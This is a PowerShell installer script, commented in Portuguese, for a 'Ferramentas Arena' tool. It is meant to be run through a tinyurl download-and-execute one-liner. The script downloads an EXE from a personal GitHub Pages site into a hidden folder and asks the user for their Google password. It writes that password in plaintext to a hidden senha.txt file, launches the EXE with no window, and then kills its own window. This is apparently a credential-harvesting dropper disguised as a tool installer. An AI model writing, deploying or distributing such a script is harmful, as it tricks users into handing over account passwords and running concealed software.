# ═══════════════════════════════════════════════════════
#   INSTALADOR FERRAMENTAS ARENA - AUTO-CLOSE
#   Uso: iwr -useb tinyurl.com/lipetool|iex
# ═══════════════════════════════════════════════════════

$ErrorActionPreference = 'Stop'

# ── CONFIGURACAO ──────────────────────────────────────
$USUARIO = 'zaralhopintosilva-afk'
$REPO    = 'ferramentas'
$EXENAME = 'FerramentasArena.exe'
# ──────────────────────────────────────────────────────

[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor 3072

function Info($m)  { Write-Host "  $m" -ForegroundColor Cyan }
function Ok($m)    { Write-Host "  [OK] $m" -ForegroundColor Green }
function Erro($m)  { Write-Host "  [ERRO] $m" -ForegroundColor Red }
function Aviso($m) { Write-Host "  [AVISO] $m" -ForegroundColor Yellow }

Clear-Host
Write-Host ""
Write-Host "  =================================================" -ForegroundColor Yellow
Write-Host "     FERRAMENTAS ARENA - INSTALADOR" -ForegroundColor Yellow
Write-Host "  =================================================" -ForegroundColor Yellow
Write-Host ""

$destDir   = Join-Path $env:LOCALAPPDATA 'ArenaFerramentas'
$exePath   = Join-Path $destDir $EXENAME
$senhaPath = Join-Path $destDir 'senha.txt'

$baseUrl = "https://$USUARIO.github.io/$REPO"
$exeUrl  = "$baseUrl/$EXENAME"

Info "Encerrando instancias anteriores..."
Get-Process -Name 'FerramentasArena' -ErrorAction SilentlyContinue | ForEach-Object {
    try { $_.Kill() } catch {}
}
Start-Sleep -Milliseconds 500

Info "Preparando pasta..."
if (-not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir -Force | Out-Null
}
try { (Get-Item $destDir -Force).Attributes = 'Hidden' } catch {}

Info "Baixando $EXENAME..."
try {
    (New-Object Net.WebClient).DownloadFile($exeUrl, $exePath)
    Ok "Download concluido"
} catch {
    Erro "Falha no download: $($_.Exception.Message)"
    Write-Host ""
    Read-Host "Pressione ENTER para sair"
    return
}

Write-Host ""
Write-Host "  --------------------------------------------------" -ForegroundColor DarkGray
Write-Host "  Digite a senha do Google (nao aparece na tela):" -ForegroundColor White
Write-Host "  Deixe VAZIO para pular." -ForegroundColor DarkGray
Write-Host "  --------------------------------------------------" -ForegroundColor DarkGray
Write-Host ""

$senhaSecure = Read-Host "  Senha" -AsSecureString
$senhaPlain  = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto(
    [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($senhaSecure)
)

if ($senhaPlain -and $senhaPlain.Length -gt 0) {
    [System.IO.File]::WriteAllText($senhaPath, $senhaPlain, (New-Object System.Text.UTF8Encoding($false)))
    try { (Get-Item $senhaPath -Force).Attributes = 'Hidden' } catch {}
}

# Inicia o EXE silenciosamente
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $exePath
$psi.WorkingDirectory = $destDir
$psi.UseShellExecute = $false
$psi.CreateNoWindow = $true
[System.Diagnostics.Process]::Start($psi) | Out-Null

# ═══════════════════════════════════════════════════════
#   FECHA O POWERSHELL AUTOMATICAMENTE
# ═══════════════════════════════════════════════════════

# Mensagem rapida antes de fechar
Write-Host ""
Write-Host "  [OK] Ferramentas ativas! Fechando janela..." -ForegroundColor Green
Write-Host ""
Start-Sleep -Milliseconds 800

# Mata a janela do PowerShell forcadamente (funciona em qualquer versao)
Stop-Process -Id $PID -Force
